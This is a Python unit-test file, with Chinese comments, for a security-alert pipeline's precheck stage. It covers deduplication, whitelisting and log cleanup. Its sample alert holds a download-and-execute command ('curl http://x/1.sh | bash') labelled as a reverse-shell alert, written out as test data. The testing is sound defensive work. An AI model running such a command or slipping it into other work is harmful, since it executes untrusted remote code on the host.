"""② 一级门控单测：12h 去重三元组 / 白名单 / 老数据清理。"""
from pipeline import precheck


CFG = {"precheck": {"dedup_hours": 12, "log_retention_days": 30,
                    "whitelist": {"users": ["zabbix"], "rules": ["官方备份脚本"], "ips": ["10.9.9.9"]}}}

ALERT = {"ip": "10.0.0.1", "command": "curl http://x/1.sh | bash",
         "alert_type": "可疑命令执行", "user": "root", "rule": "反弹Shell"}


def _seed_pushed(db, key, pushed_ts):
    conn = __import__("common").init_db(db)
    with conn:
        conn.execute("INSERT INTO push_log (dedup_key, pushed_ts) VALUES (?, ?)", (key, pushed_ts))
    conn.close()


def test_dedup_within_window(env):
    cfg, run_d = env
    t0 = 1_000_000_000.0
    _seed_pushed(run_d / "push_log.db", precheck.dedup_key(ALERT), t0)
    r = precheck.run_precheck([ALERT], CFG, db=run_d / "push_log.db", now_ts=t0 + 3600)
    assert r["deduped"] == 1 and not r["has_alerts"]


def test_dedup_expired(env):
    cfg, run_d = env
    t0 = 1_000_000_000.0
    _seed_pushed(run_d / "push_log.db", precheck.dedup_key(ALERT), t0)
    r = precheck.run_precheck([ALERT], CFG, db=run_d / "push_log.db", now_ts=t0 + 13 * 3600)
    assert r["has_alerts"] and r["survivors"][0]["ip"] == "10.0.0.1"


def test_dedup_key_triple():
    a = dict(ALERT)
    b = dict(ALERT, command="curl http://x/2.sh | bash")  # 命令变化 → 不同 key
    c = dict(ALERT, alert_type="Webshell")               # 类型变化 → 不同 key
    k = precheck.dedup_key(a)
    assert precheck.dedup_key(b) != k and precheck.dedup_key(c) != k


def test_whitelist(env):
    cfg, run_d = env
    alerts = [dict(ALERT, user="zabbix"),
              dict(ALERT, ip="10.9.9.9"),
              dict(ALERT, rule="官方备份脚本"),
              dict(ALERT)]
    r = precheck.run_precheck(alerts, CFG, db=run_d / "push_log.db")
    assert r["whitelisted"] == 3 and len(r["survivors"]) == 1


def test_cleanup_old_rows(env):
    cfg, run_d = env
    t0 = 1_000_000_000.0
    db = run_d / "push_log.db"
    _seed_pushed(db, precheck.dedup_key(ALERT), t0 - 3600)     # 1h 前推过同款 → 12h 去重
    _seed_pushed(db, "ancient-key", t0 - 40 * 86400)           # 40 天前 → 超保留期清理
    r = precheck.run_precheck([ALERT], CFG, db=db, now_ts=t0)
    assert r["cleaned_rows"] == 1
    assert r["deduped"] == 1 and not r["has_alerts"]
